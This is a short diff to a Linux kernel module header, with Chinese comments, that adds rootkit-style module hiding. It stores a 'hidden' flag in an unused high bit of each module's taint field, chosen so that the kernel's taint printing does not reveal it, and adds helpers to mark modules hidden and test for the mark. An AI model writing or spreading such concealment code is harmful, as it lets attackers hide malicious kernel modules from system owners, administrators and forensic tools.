@@ -47,20 +47,20 @@ struct kernel_symbol {
 extern struct mutex module_mutex;
 extern struct list_head modules;
 
-/* ---- HIDE ---- 隐藏模块：名称配置 + 判定辅助函数 ----
- * 注意：两个 helper 都必须在使用点（main.c / sysfs.c）之前可见，
- * 且 struct module 的完整定义由 <linux/module.h> 提供。
- */
-#define HIDDEN_MODULE_NAME "hello"	/* 改成你要隐藏的 ko 名字 */
+/* ---- HIDE ---- 热开关版：隐藏标记存在 mod->taints 的最高位。
+ * 不改 struct module（改了会导致 .gnu.linkonce.this_module 段大小校验
+ * 失败、系统全部模块加载失败无法开机）。
+ * 该位超出 TAINT_FLAGS_COUNT，module_flags_taint() 不会把它打印出来 ---- */
+#define MOD_TAINT_HIDDEN	(BITS_PER_LONG - 1)
+
+static inline void mod_mark_hidden(struct module *mod)
+{
+	set_bit(MOD_TAINT_HIDDEN, &mod->taints);
+}
 
 static inline bool mod_should_hide(const struct module *mod)
 {
-	return mod && strcmp(mod->name, HIDDEN_MODULE_NAME) == 0;
-}
-
-static inline bool mod_should_hide_name(const char *name)
-{
-	return name && strcmp(name, HIDDEN_MODULE_NAME) == 0;
+	return mod && test_bit(MOD_TAINT_HIDDEN, &mod->taints);
 }
 /* ---- HIDE END ---- */
 
